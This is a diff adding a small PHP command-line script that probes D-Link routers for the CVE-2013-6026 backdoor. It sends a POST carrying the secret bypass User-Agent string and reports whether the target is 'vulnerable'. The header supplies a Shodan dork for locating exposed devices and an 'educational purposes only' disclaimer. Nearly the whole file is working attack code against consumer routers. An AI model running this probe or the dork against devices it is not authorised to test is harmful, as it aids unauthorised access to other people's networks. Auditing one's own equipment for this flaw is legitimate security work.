@@ -1,0 +1,62 @@
+#!/usr/bin/php
+<?php
+/*
+.---------------------------------.
+|                                 |
+| dlinkd - D-link backdoor czechr |
+|                                 |
+.-------------------------------------------------------------------------------.
+| Written by @dustyfresh - 10/13             |
+.-------------------------------------------------------------------------------.
+| See:  http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/
+|  http://www.security-database.com/detail.php?alert=CVE-2013-6026
+| Usage(command-line only):
+|  ./dlinkd http://192.168.1.1:8080/
+| Shodan dork:
+|  thttpd-alphanetworks/2.23
+.-------------------------------------------------------------------------------.
+| Educational purposes only, kkthnx.            |
+| http://rootatx.com/ || http://staypimp.in/          |
+.-------------------------------------------------------------------------------.
+|   GNU GENERAL PUBLIC LICENSE
+|
+|  Version 3, 29 June 2007
+|
+|  Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org/>
+|  Everyone is permitted to copy and distribute verbatim copies of this license
+|  document, but changing it is not allowed.
+|
+|  http://www.gnu.org/licenses/gpl.html
+.-------------------------------------------------------------------------------.
+*/
+  error_reporting(1);
+        set_time_limit(0); // ain't nobody got time fo' dat
+        $help = "\t--help, this help menu\n\nexample: ./dlinkd http://192.168.1.1:8080\n";
+        $host = $argv[1];
+        $curl = curl_init($host);
+        $swag = array(
+                CURLOPT_HEADER => 'true',
+                CURLOPT_POST => 'true',
+                CURLOPT_USERAGENT => 'xmlset_roodkcableoj28840ybtide', // the secret ingredient
+                CURLOPT_RETURNTRANSFER => 1
+                );
+        curl_setopt_array($curl,$swag);
+        switch($argv[1]){
+                case NULL:
+                die($help);
+                break;
+                case "--help":
+                die($help);
+                break;
+        }
+        $sup = curl_exec($curl);
+        $return = curl_getinfo($curl);
+        curl_close($curl);
+        $exit = $return['http_code'];
+        if($exit != 200){
+                print "[$host] :( This door is locked.\n";
+        } else {
+                print "THIS IS A TRIUMPH! [$host] is vulnerable\n";
+    // 'murica, ah'll tell u whut
+        }
+?>
